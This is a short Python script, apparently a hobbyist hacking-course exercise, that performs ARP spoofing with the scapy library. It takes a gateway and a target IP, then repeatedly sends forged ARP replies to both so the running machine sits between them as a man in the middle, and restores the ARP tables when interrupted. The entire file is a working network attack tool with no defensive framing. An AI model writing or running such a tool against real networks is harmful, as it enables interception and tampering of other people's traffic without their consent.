#! usr/share/env python

import scapy.all as scapy
import time
import optparse

#Get the Arguments from the user
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-g","--gateway_ip",dest = "gateway_ip",help = "IP of the gateway")
    parser.add_option("-t","--target_ip",dest = "target_ip",help = "IP of the target")
    (options,arguments) = parser.parse_args()
    if not options.gateway_ip:
        parser.error("[+]Specify the Gateway IP")
    if not options.target_ip:
        parser.error("[+]Specify the Target IP")
    return options

#Function extrtacts MAC address from an IP
def getmac(ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
        return answered_list[0][1].hwsrc

#Function fools Router that we are Target Machine and also fools the target machine 5that we are the Router
def spoof(target_ip,spoof_ip):
    target_mac = getmac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet,verbose = False)


#Function Restores the original MAC and resets the IP tables to their original value
def restore(destination_ip,source_ip):
    destination_mac = getmac(destination_ip)
    source_mac = getmac(source_ip)
    packet = scapy.ARP(op=2, pdst = destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count = 4,verbose = False)

options = get_arguments()
sent_packet_count = 0

#Exception handling is used to handle the while loop
try:
    while True:
        spoof(options.gateway_ip,options.target_ip)
        spoof(options.target_ip,options.gateway_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet Sent Count : " + str(sent_packet_count), end ="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] CTRL + C detected QUITTING the Program ")
    restore(options.gateway_ip,options.target_ip)
    restore(options.target_ip,options.gateway_ip)


